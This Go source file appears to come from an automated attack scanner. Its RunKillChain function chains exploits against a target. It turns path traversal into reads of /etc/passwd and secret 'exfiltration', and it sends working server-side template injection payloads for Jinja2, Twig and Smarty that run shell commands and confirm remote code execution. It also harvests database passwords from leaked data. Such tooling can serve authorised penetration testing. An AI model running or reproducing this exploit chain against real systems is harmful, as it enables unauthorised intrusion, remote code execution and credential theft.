package engine

import (
	"fmt"
	"io"
	"strings"
)

// KillChain orchestrates multi-step attacks based on initial findings
func (e *Engine) RunKillChain(target string, findings []Result) []Result {
	fmt.Printf("[KILL-CHAIN] Orchestrating automated multi-step attacks for: %s...\n", target)
	var additionalFindings []Result

	for _, res := range findings {
		// 1. Path Traversal -> Search for Secrets
		if strings.Contains(res.TemplateID, "traversal") || strings.Contains(res.TemplateID, "lfi") {
			fmt.Printf("    [CHAIN] Detected LFI. Attempting secret exfiltration...\n")
			secrets := e.DownloadAndExfiltrate(res.Target + "/../../../../../../../../../etc/passwd")
			if len(secrets) > 0 {
				additionalFindings = append(additionalFindings, Result{
					TemplateID: "chain-lfi-secrets",
					Target:    res.Target,
					Evidence:   "Credential leak via chained LFI attack.",
					ExfiltratedData: secrets,
				})
			}
		}

		// 2. SSTI -> RCE Escalation (Titan Ares Overdrive)
		if strings.Contains(res.TemplateID, "ssti") {
			fmt.Printf("    [CHAIN] Detected SSTI. Attempting RCE escalation (Overdrive Mode)...\n")
			rcePayloads := []string{
				"{{self._TemplateReference__context.namespace.cycler.__init__.__globals__.os.popen('id').read()}}", // Jinja2
				"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",           // Twig
				"{{`id`}}", // Smarty
			}
			for _, p := range rcePayloads {
				u := strings.Replace(res.Target, res.Evidence, p, 1) // Evidence usually contains the successful {{7*7}}
				if u == res.Target { 
					// fallback: append if evidence replacement fails
					u = res.Target + p
				}
				resp, _ := e.Client.Get(u)
				if resp != nil {
					defer resp.Body.Close()
					body, _ := io.ReadAll(resp.Body)
					if strings.Contains(string(body), "uid=") {
						fmt.Printf("    [!!!] ARES SUCCESS: SSTI escalated to RCE!\n")
						additionalFindings = append(additionalFindings, Result{
							TemplateID: "chain-ssti-rce",
							Target:    u,
							Evidence:   "Remote Code Execution confirmed via SSTI escalation.",
							Exploited: true,
						})
					}
				}
			}
		}

		// 3. Secret Found -> DB Probing
		if len(res.ExfiltratedData) > 0 {
			fmt.Printf("    [CHAIN] Found secrets. Attempting database probing...\n")
			for k, v := range res.ExfiltratedData {
				if strings.Contains(k, "DB_PASSWORD") {
					// automated check for open db ports would be here
					evidence := fmt.Sprintf("Found DB Credential: %s=%s", k, v)
					additionalFindings = append(additionalFindings, Result{
						TemplateID: "chain-secret-probe",
						Target:    res.Target,
						Evidence:   evidence,
					})
				}
			}
		}
	}

	return additionalFindings
}
